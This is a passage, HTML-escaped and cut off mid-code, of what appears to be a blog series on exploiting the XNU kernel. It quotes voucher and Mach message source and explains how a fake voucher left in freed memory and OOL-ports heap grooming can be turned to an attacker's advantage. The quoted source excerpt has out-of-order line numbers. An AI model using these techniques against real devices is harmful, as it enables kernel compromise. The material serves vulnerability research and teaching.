&lt;p&gt;Then there is the call to &lt;strong&gt;convert_voucher_to_port&lt;/strong&gt; on Line 2695 which looks like this.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;492&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    493:  * Convert a voucher to a port.
    494:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;495&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;496&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;convert_voucher_to_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;497&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;498&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;499&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IV_NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;501&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;502&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;503&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os_ref_get_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_refs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;504&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;505&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;cm&quot;&gt;/* create a port if needed */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;506&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;507&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;508&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port_alloc_kernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;509&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;510&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ipc_kobject_set_atomically&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_kobject_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_VOUCHER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;511&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* If we lose the race, deallocate and pick up the other guy's port */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;513&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OSCompareAndSwapPtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;514&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;ipc_port_dealloc_kernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;515&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;516&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_kotype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_VOUCHER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;517&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_kobject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_kobject_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;518&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;519&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;520&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;One of the first things which is checked on Line 503 is whether the voucher has a proper ref count. Then on line 507, the voucher’s port is being checked for validity. If it is not valid, a freshly new voucher port is allocated. This is great because while allocating a fake voucher in place of the freed voucher, if we somehow keep the &lt;strong&gt;iv_port&lt;/strong&gt; pointer to be &lt;strong&gt;NULL&lt;/strong&gt;, then we can actually also get a freshly allocated voucher port (&lt;strong&gt;IKOT_VOUCHER&lt;/strong&gt;) for that particular voucher back to userspace, which we can then reference with &lt;strong&gt;ith_voucher-&amp;gt;iv_port&lt;/strong&gt;. This will allow us to further manipulate the voucher.&lt;/p&gt;

&lt;h3 id=&quot;heap-feng-shu-via-ool-ports-descriptor&quot;&gt;Heap Feng Shu via OOL Ports Descriptor&lt;/h3&gt;

&lt;p&gt;As discussed briefly in Part 1, complex Mach Messages have a descriptor field, which could be of four types.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;MACH_MSG_PORT_DESCRIPTOR&lt;/strong&gt;: Sending a port in a message&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;MACH_MSG_OOL_DESCRIPTOR&lt;/strong&gt;: Sending OOL data in a message&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;MACH_MSG_OOL_PORTS_DESCRIPTOR&lt;/strong&gt;: Sending OOL ports array in a message&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;MACH_MSG_OOL_VOLATILE_DESCRIPTOR&lt;/strong&gt;: Sending volatile data in a message&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When a Mach message is sent with &lt;strong&gt;MACH_MSG_OOL_PORTS_DESCRIPTOR&lt;/strong&gt;, it calls the function &lt;strong&gt;ipc_kmsg_copyin_ool_ports_descriptor&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2799&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2800&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_copyin_ool_ports_descriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2801&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;mach_msg_ool_ports_descriptor_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dsc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2802&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_dsc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2803&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_64bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2804&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;vm_map_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2805&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_space_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2806&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_object_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2807&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_kmsg_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2808&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;mach_msg_option_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optionp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2809&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2810&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2811&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2812&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;ipc_object_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2813&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2814&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;mach_vm_offset_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2865&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os_mul_overflow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ports_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2866&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_SEND_TOO_LARGE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2867&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2868&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2815&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;mach_msg_type_name_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_disp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2874&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2875&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ports_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2876&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_dsc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2877&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2878&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2879&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ports_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2880&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2881&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2882&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_SEND_NO_BUFFER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2883&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2884&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2902&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;objects&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_object_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2903&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;dsc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2904&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2905&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2906&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2907&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;ipc_object_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
